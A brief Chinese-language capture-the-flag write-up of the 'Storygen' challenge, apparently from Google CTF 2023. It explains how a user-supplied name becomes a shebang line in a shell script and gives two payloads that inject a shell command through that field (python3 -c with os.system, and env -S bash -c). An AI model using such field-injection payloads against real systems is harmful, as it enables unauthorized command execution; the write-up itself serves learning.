# Storygen

> 	这似乎是做出人数最多的一道题之一。相比于 pwn，感觉这道题更适合被归类到 misc 中。

## Analysis

这道题的漏洞点很简单（似乎 23 年的 GoogleCTF 的漏洞点都不算太复杂）：shell 脚本中最前面的 `#`。

我们可以控制 `@NAME` 的值来劫持程序去执行我们的命令，主要难点在于要 getshell 执行带有参数的 elf，并分割开 `'s story` 和输入命令。

---

## Exploitation

我暂时只想到两种：

借助 python -c：

`!/usr/bin/python3 -c'import os;os.system("sh");#'`

借助 /usr/bin/env bash：

`!/usr/bin/env -S bash -c "/bin/sh" \`

---
